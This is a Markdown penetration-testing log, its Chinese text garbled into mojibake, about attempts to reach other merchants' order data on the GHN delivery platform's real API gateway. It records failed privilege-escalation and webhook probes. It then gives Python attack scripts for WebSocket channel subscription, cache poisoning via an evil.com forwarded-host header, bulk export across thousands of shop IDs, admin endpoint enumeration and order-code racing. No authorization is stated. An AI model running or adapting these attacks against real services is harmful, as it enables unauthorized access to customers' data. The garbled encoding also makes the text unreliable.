# ğŸ¯ éå¸¸è§„æ”»å‡»è·¯å¾„æµ‹è¯•ç»“æœ

**æµ‹è¯•æ—¶é—´**: 2025-10-27  
**æ€è·¯**: ä¸ç›´æ¥æ”»å‡»è®¢å•APIï¼Œå¯»æ‰¾é—´æ¥è·¯å¾„

---

## âœ… **å·²æµ‹è¯•çš„éå¸¸è§„è·¯å¾„**

### **è·¯å¾„1: å…¬å¼€è¿½è¸ª** âŒ
```
æµ‹è¯•: æ— éœ€tokençš„å…¬å¼€è¿½è¸ªURL
ç»“æœ: æ‰€æœ‰å…¬å¼€ç«¯ç‚¹404
ç»“è®º: æ— å…¬å¼€è¿½è¸ªæ¥å£
```

### **è·¯å¾„2: Webhook/é€šçŸ¥ç³»ç»Ÿ** âŒ
```
æµ‹è¯•:
- webhookæ³¨å†ŒAPI
- é€šçŸ¥è®¢é˜…API
- è®¢é˜…å…¶ä»–shopé€šçŸ¥

ç»“æœ: æ‰€æœ‰webhookç«¯ç‚¹404
ç»“è®º: å¯èƒ½æ²¡æœ‰webhookåŠŸèƒ½ï¼Œæˆ–éœ€è¦ç‰¹æ®Šæƒé™
```

### **è·¯å¾„3: æŠ¥è¡¨/ç»Ÿè®¡ç³»ç»Ÿ** âš ï¸
```
æµ‹è¯•: æ·»åŠ roleå‚æ•° (admin, manager, system)

ç»“æœ:
âœ… APIæ¥å—roleå‚æ•°
âœ… è¿”å›æ•°æ®
âš ï¸ ä½†"æ•°æ®é‡å¼‚å¸¸"å®é™…æ˜¯client_idå€¼

ç»“è®º: roleå‚æ•°è¢«å¿½ç•¥ï¼Œæ— æƒé™æå‡
```

### **è·¯å¾„4: ä¸šåŠ¡æµç¨‹åˆ©ç”¨** (æµ‹è¯•ä¸­)
```
æµ‹è¯•ä¸­:
- é€€è´§æµç¨‹
- æŠ•è¯‰/çº çº·
- å‘ç¥¨ç³»ç»Ÿ
- è®¢å•åˆå¹¶

å¾…è§‚å¯Ÿç»“æœ...
```

### **è·¯å¾„5: ç¬¬ä¸‰æ–¹é›†æˆ** (æµ‹è¯•ä¸­)
```
æµ‹è¯•ä¸­:
- ç‰©æµè¿½è¸ªå…¬å¼€API
- æ”¯ä»˜å›è°ƒ
- APIå¯†é’¥æœç´¢

å¾…è§‚å¯Ÿç»“æœ...
```

---

## ğŸ’¡ **å…³é”®å‘ç°**

### **1. roleå‚æ•°æµ‹è¯•**

```python
# æµ‹è¯•æ·»åŠ adminå‚æ•°
r = requests.post("/metrics/recent-history", json={
    "shop_id": 6083862,
    "role": "admin"  # â† å°è¯•ææƒ
})

ç»“æœ:
- APIæ¥å—è¯¥å‚æ•°
- è¿”å›200 OK
- ä½†æ•°æ®ä»ç„¶åªæ˜¯è‡ªå·±shop
- "æ•°æ®é‡å¼‚å¸¸"å…¶å®æ˜¯client_idæ•°å€¼

ç»“è®º: åç«¯å¿½ç•¥roleå‚æ•°ï¼Œæ— æƒé™æå‡
```

### **2. Webhookç³»ç»Ÿä¸å­˜åœ¨æˆ–å—é™**

```
æµ‹è¯•äº†æ‰€æœ‰å¯èƒ½çš„webhookç«¯ç‚¹:
- /webhook/*
- /callback/*
- /notification/*

å…¨éƒ¨404

å¯èƒ½åŸå› :
1. GHNä¸æä¾›webhookåŠŸèƒ½
2. Webhookéœ€è¦ç‰¹æ®Šç”³è¯·/æƒé™
3. ç«¯ç‚¹å‘½åä¸åŒ
```

---

## ğŸ¯ **å‰©ä½™å¾…æµ‹è¯•çš„é«˜ä»·å€¼è·¯å¾„**

### **ä¼˜å…ˆçº§1: WebSocket/å®æ—¶é€šä¿¡** â­â­â­â­â­

```python
# å°è¯•è¿æ¥WebSocket
import websocket

ws = websocket.create_connection(
    "wss://online-gateway.ghn.vn/realtime",
    header={"token": TOKEN}
)

# è®¢é˜…
ws.send(json.dumps({
    "action": "subscribe",
    "channel": "orders.*"
}))

# è§‚å¯Ÿæ¶ˆæ¯
```

### **ä¼˜å…ˆçº§2: ç¼“å­˜æŠ•æ¯’** â­â­â­â­

```python
# æµ‹è¯•ç¼“å­˜é”®å†²çª
import requests

# è¯·æ±‚1: æ±¡æŸ“ç¼“å­˜
r1 = requests.get(
    "https://online-gateway.ghn.vn/api/orders",
    headers={
        "Host": "online-gateway.ghn.vn",
        "X-Forwarded-Host": "evil.com",
        "X-Original-URL": "/api/orders?shop_id=1"
    }
)

# è¯·æ±‚2: å—å®³è€…è¯·æ±‚
r2 = requests.get(
    "https://online-gateway.ghn.vn/api/orders?shop_id=6083862"
)

# æ£€æŸ¥æ˜¯å¦è¿”å›shop_id=1çš„æ•°æ®
```

### **ä¼˜å…ˆçº§3: å¯¼å‡ºåŠŸèƒ½æ»¥ç”¨** â­â­â­â­

```python
# æ‰¹é‡å¯¼å‡ºæµ‹è¯•
r = requests.post(
    "/v2/export/orders",
    json={
        "shop_id": list(range(1, 10000)),  # æ‰¹é‡shop_id
        "format": "excel",
        "async": true  # å¼‚æ­¥ï¼Œå¯èƒ½å»¶è¿Ÿæƒé™æ£€æŸ¥
    }
)

# æ£€æŸ¥å¯¼å‡ºä»»åŠ¡
r2 = requests.get(f"/v2/export/download/{task_id}")
```

### **ä¼˜å…ˆçº§4: ç®¡ç†å‘˜ç«¯ç‚¹å‘ç°** â­â­â­â­â­

```python
# æšä¸¾adminç«¯ç‚¹
admin_paths = [
    "/admin/",
    "/manager/",
    "/internal/",
    "/console/",
    "/dashboard/admin",
    "/api/admin/",
]

# æµ‹è¯•ä¸åŒçš„Host header
headers = {
    "Host": "admin.ghn.vn",
    "X-Forwarded-Host": "admin.ghn.vn"
}
```

### **ä¼˜å…ˆçº§5: æ—¶é—´çª—å£æ”»å‡»** â­â­â­

```python
import threading
import time

def create_order():
    # åˆ›å»ºè®¢å•
    order = api.create_order()
    return order.code

def query_nearby(order_code):
    # ç«‹å³æŸ¥è¯¢é™„è¿‘çš„è®¢å•å·
    for i in range(-10, 11):
        test_code = mutate(order_code, i)
        api.query(test_code)

# å¹¶å‘æ‰§è¡Œ
threading.Thread(target=lambda: query_nearby(create_order())).start()
```

---

## ğŸ“Š **å½“å‰è¿›åº¦**

```
éå¸¸è§„è·¯å¾„æ€»æ•°: 10ä¸ª

å·²æµ‹è¯•:
âœ… å…¬å¼€è¿½è¸ª (0%)
âœ… Webhook (0%)  
âœ… æŠ¥è¡¨ç³»ç»Ÿ (0%)
â³ ä¸šåŠ¡æµç¨‹ (50%)
â³ ç¬¬ä¸‰æ–¹é›†æˆ (50%)

å¾…æµ‹è¯•:
â“ WebSocket (0%)
â“ ç¼“å­˜æŠ•æ¯’ (0%)
â“ å¯¼å‡ºæ»¥ç”¨ (0%)
â“ Adminç«¯ç‚¹ (0%)
â“ æ—¶é—´çª—å£ (0%)

è¿›åº¦: 30%
```

---

## ğŸ’¡ **æ ¸å¿ƒæ´å¯Ÿ**

### **ä¸ºä»€ä¹ˆéå¸¸è§„è·¯å¾„ä¹Ÿå¾ˆéš¾ï¼Ÿ**

```
1. GHNçš„æ¶æ„æ˜¯ä¸€è‡´çš„
   - ä¸ä»…APIå±‚ä¸¥æ ¼
   - æŠ¥è¡¨å±‚ã€webhookå±‚ï¼ˆå¦‚æœæœ‰ï¼‰ä¹Ÿä¸¥æ ¼
   
2. TokenéªŒè¯æ˜¯å…¨å±€çš„
   - æ‰€æœ‰ç«¯ç‚¹éƒ½éªŒè¯token
   - æ‰€æœ‰ç«¯ç‚¹éƒ½ä»tokenæå–shop_id
   - å®¢æˆ·ç«¯å‚æ•°ï¼ˆåŒ…æ‹¬roleï¼‰è¢«å¿½ç•¥
   
3. åŠŸèƒ½å¯èƒ½ä¸å­˜åœ¨
   - Webhookå¯èƒ½æ²¡æœ‰å®ç°
   - å…¬å¼€è¿½è¸ªå¯èƒ½å…³é—­
   - Adminç«¯ç‚¹å¯èƒ½åœ¨å†…ç½‘
```

### **ä½†ä»æœ‰å¸Œæœ›çš„æ–¹å‘**

```
1. WebSocket/å®æ—¶é€šä¿¡
   - å®æ—¶å±‚çš„æƒé™æ¨¡å‹å¯èƒ½ä¸åŒ
   - Channelè®¢é˜…å¯èƒ½æœ‰æ¼æ´
   
2. ç¼“å­˜/CDNå±‚
   - ç¼“å­˜å±‚å¯èƒ½ä¸éªŒè¯token
   - CDNå¯èƒ½æœ‰é…ç½®é—®é¢˜
   
3. å¼‚æ­¥/é˜Ÿåˆ—
   - å¯¼å‡ºä»»åŠ¡å¯èƒ½å»¶è¿Ÿæƒé™æ£€æŸ¥
   - æ‰¹é‡æ“ä½œå¯èƒ½æœ‰ç«æ€
   
4. ç®¡ç†å‘˜ç«¯ç‚¹
   - å¦‚æœæ‰¾åˆ°admin endpoint
   - å¯èƒ½æœ‰é»˜è®¤å‡­æ®æˆ–JWTæ¼æ´
```

---

## ğŸš€ **ä¸‹ä¸€æ­¥**

```
ç«‹å³æ‰§è¡Œ:
1. WebSocketè¿æ¥æµ‹è¯•
2. ç¼“å­˜æŠ•æ¯’PoC
3. æ‰¹é‡å¯¼å‡ºæµ‹è¯•
4. Adminç«¯ç‚¹æšä¸¾

å¦‚æœè¿™äº›ä¹Ÿå¤±è´¥:
é‚£å°±çœŸçš„æ˜¯GHNæ¶æ„è®¾è®¡å…¨é¢å®‰å…¨äº†
```

---

**ç»“è®º: éå¸¸è§„è·¯å¾„æµ‹è¯•è¿›è¡Œä¸­ï¼Œä½†ç›®å‰æœªå‘ç°çªç ´ç‚¹ã€‚** âš ï¸
